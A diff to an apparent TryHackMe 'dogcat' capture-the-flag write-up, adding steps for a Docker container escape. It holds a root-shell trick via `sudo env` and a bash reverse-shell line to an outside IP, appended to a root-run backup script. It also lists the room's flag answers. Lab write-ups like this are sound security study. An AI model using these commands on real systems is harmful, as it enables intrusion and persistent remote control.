@@ -79,3 +79,9 @@ This allowed me to run `sudo /usr/bin/env /bin/sh` to get a root shell.
 11. The third flag was in `/root/flag3.txt`: `THM{D1ff3r3nt_3nv1ronments_874112}`. Still need to find 2 and 4.
 
 12. Browsing into /var/www I found flag2: `THM{LF1_t0_RC3_aec3fb}`. The flag file was `/var/www/flag2_QMW7JvaY2LvK.txt`
+
+I was stuck at this point. Tried all sorts of things including grepping the file system, but couldn't find the fourth flag. I found an /opt/backups/backup.tar, but its contents were just the current system, including the flags I had already found. I also found a .dockerenv and dockerfile, file, but didn't make the connection. The answer was that this is all running inside a docker container, and I needed to escape it. The backup.tar file was next to a backup.sh file, presumably run from outside.
+
+13. Adding onto /opt/backups/backup.sh the following `bash -i >& /dev/tcp/10.10.78.44/4443 0>&1` via `echo >>` as root, I set up a reverse listener on my host and waited. Soon I got a `root@dogcat`.
+
+14. ls -lA revealed flag4.txt, and catting that got me `THM{esc4l4tions_on_esc4l4tions_on_esc4l4tions_7a52b17dba6ebb0dc38bc1049bcba02d}`
